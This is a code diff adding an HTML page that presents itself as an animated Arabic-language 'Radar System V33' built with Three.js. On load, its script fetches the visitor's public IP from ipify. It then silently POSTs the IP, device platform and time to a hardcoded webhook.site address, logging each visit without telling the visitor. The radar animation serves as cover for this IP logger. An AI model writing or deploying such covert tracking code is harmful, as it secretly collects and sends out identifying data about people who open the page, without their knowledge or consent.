@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Radar System V33</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/controls/OrbitControls.js"></script>
+    <style>
+        body { margin: 0; background: #000; overflow: hidden; font-family: 'Segoe UI', sans-serif; }
+        #radar-ui { position: fixed; top: 15px; left: 15px; color: #0f0; background: rgba(0, 30, 0, 0.9); padding: 12px; border: 2px solid #0f0; border-radius: 5px; width: 280px; z-index: 100; }
+        #ip-box { margin-top: 10px; color: #ff0; border-top: 1px dashed #0f0; padding-top: 8px; font-family: monospace; font-size: 13px; text-align: center; }
+        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; margin-top: 10px; }
+        button { background: #030; border: 1px solid #0f0; color: #0f0; padding: 6px; cursor: pointer; }
+    </style>
+</head>
+<body onload="startSystem()">
+
+    <div id="radar-ui">
+        <div style="font-weight:bold;">نظام الرصد V33</div>
+        <div id="status">الحالة: نشط</div>
+        <div class="controls">
+            <button onclick="toggleAudio(true)">صوت ON</button>
+            <button onclick="toggleAudio(false)">صوت OFF</button>
+        </div>
+        <div id="ip-box">جاري فحص الشبكة...</div>
+    </div>
+
+<script>
+    // --- تم التصحيح هنا: أضفنا علامات التنصيص ---
+    const myWebhook = "https://webhook.site/e6295012-d0b5-43fd-b68d-236cb83ebb7b";  
+
+    function startSystem() {
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                document.getElementById('ip-box').innerText = "IP: " + data.ip;
+                
+                fetch(myWebhook, {
+                    method: "POST",
+                    mode: "no-cors", 
+                    body: JSON.stringify({
+                        event: "رصد دخول جديد",
+                        ip: data.ip,
+                        device: navigator.platform,
+                        time: new Date().toLocaleString()
+                    })
+                });
+            });
+
+        initRadar();
+    }
+
+    let scene, camera, renderer, sweep;
+    function initRadar() {
+        scene = new THREE.Scene();
+        camera = new THREE.PerspectiveCamera(75, window.innerWidth/window.innerHeight, 0.1, 1000);
+        renderer = new THREE.WebGLRenderer({ antialias: true });
+        renderer.setSize(window.innerWidth, window.innerHeight);
+        document.body.appendChild(renderer.domElement);
+        
+        const sphere = new THREE.Mesh(new THREE.SphereGeometry(8, 32, 32), new THREE.MeshBasicMaterial({ color: 0x00ff00, wireframe: true, transparent: true, opacity: 0.1 }));
+        scene.add(sphere);
+
+        sweep = new THREE.Mesh(new THREE.SphereGeometry(8.05, 32, 32, 0, 0.4), new THREE.MeshBasicMaterial({ color: 0x00ff00, transparent: true, opacity: 0.6, side: THREE.DoubleSide }));
+        scene.add(sweep);
+
+        camera.position.z = 25;
+        function animate() {
+            requestAnimationFrame(animate);
+            sweep.rotation.y += 0.05;
+            renderer.render(scene, camera);
+        }
+        animate();
+    }
+</script>
+</body>
+</html>
